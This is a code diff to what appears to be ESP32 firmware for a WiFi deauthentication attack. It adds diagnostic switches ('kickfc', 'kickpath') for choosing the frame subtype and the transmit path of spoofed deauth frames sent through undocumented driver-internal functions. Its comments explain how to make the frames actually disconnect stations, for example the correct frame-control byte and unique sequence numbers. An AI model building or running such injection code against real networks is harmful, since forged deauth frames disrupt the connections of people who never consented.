@@ -15,6 +15,14 @@ uint32_t txTestSent = 0, txTestFail = 0;
 // up a SoftAP to give the MAC a real BSS context and injects from WIFI_IF_AP instead. Toggled with
 // "softap 1". Tears down promiscuous sniffing while active — see docs/DEVELOPER.md section 11.
 wifi_interface_t txIface = WIFI_IF_STA;
+// DIAGNOSTIC (§11): FC byte0 written on the internal kick path. 0xC0 = deauth (the real attack). Set to
+// 0x80 with "kickfc 80" to send a beacon down the SAME descriptor path: the witness then tells us whether
+// that path radiates at all, separating "internal path is dead" from "deauth subtype is dropped".
+volatile uint8_t kickFc = 0xC0;
+// DIAGNOSTIC (§11): the internal slot path is preferred whenever a slot exists, so the raw
+// esp_wifi_80211_tx fallback normally never runs and has never been measured on this silicon.
+// "kickpath 1" forces it so the witness can say what that path actually does.
+volatile bool forceRawKick = false;
 bool softApPoc = false;
 
 // DIAGNOSTIC build 2: the driver-internal deauth path. These live in libnet80211.a with no public
@@ -271,7 +279,7 @@ void sendInternalKick() {
         // FC must stay a *deauthentication*: type 0 (management), subtype 12 -> byte0 0xC0, and management
         // frames carry no ToDS/FromDS, so byte1 is 0x00. (A previous build wrote [C8 02] here, which is
         // type 2 / subtype 12 = a QoS-Null data frame: stations ignore it, so nothing was ever kicked.)
-        D[off] = 0xC0;  D[1 + off] = 0x00;
+        D[off] = kickFc;  D[1 + off] = 0x00;   // DIAGNOSTIC: subtype overridable, see kickFc above
         D[2 + off] = 0x32;  D[3 + off] = 0x00;   // duration 50 us, as real APs emit
         
         // CRITICAL FIX: Set unique sequence number per frame - without this all frames appear as duplicates
@@ -331,7 +339,7 @@ void serviceDeauth() {
         stopDeauth();
         return;
     }
-    if (*(const uint32_t*)deauth.slotPad) {   // driver-internal deauth with spoofed SA/BSSID (the normal case)
+    if (!forceRawKick && *(const uint32_t*)deauth.slotPad) {   // driver-internal deauth with spoofed SA/BSSID (the normal case)
         for (int k = 0; k < 4; k++) sendInternalKick();
     } else {
         for (int k = 0; k < 4; k++) sendKickFrame(deauth.bssid, false);   // no slot: fall back to raw [80] kicks
